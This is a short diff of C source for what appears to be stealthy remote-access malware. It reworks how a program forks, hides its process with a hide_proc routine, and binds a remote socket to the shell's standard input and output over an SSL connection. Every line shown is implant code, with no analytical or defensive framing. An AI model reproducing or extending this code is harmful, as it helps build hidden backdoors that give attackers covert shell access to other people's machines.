@@ -139,15 +139,6 @@ void run_remote_shell(void) {
 
     printf("shell running\n");
 
-    if (wrapped_fork()) {
-        exit(EXIT_SUCCESS);
-    }
-    setsid();
-
-    sleep(1);
-
-    hide_proc();
-
     dup2(remote_sock, 0);
     dup2(remote_sock, 1);
     dup2(remote_sock, 2);
@@ -319,8 +310,6 @@ void epoll_event_loop(SSL* ssl) {
     add_read_socket_epoll(efd, conn_sock);
     add_read_socket_epoll(efd, remote_shell_sock);
     add_read_socket_epoll(efd, local_socks[0]);
-
-    hide_proc();
 
     for (;;) {
         int n = wait_for_epoll_event(efd, eventList);
@@ -610,6 +599,8 @@ int main(void) {
     SSL_write(ssl, tmp_buf, 20);
 
     if (!wrapped_fork()) {
+        promote_child();
+        hide_proc();
         run_remote_shell();
     } else {
         promote_child();
@@ -633,6 +624,7 @@ int main(void) {
 
     if (!wrapped_fork()) {
         promote_child();
+        hide_proc();
         epoll_event_loop(ssl);
     } else {
         setsid();
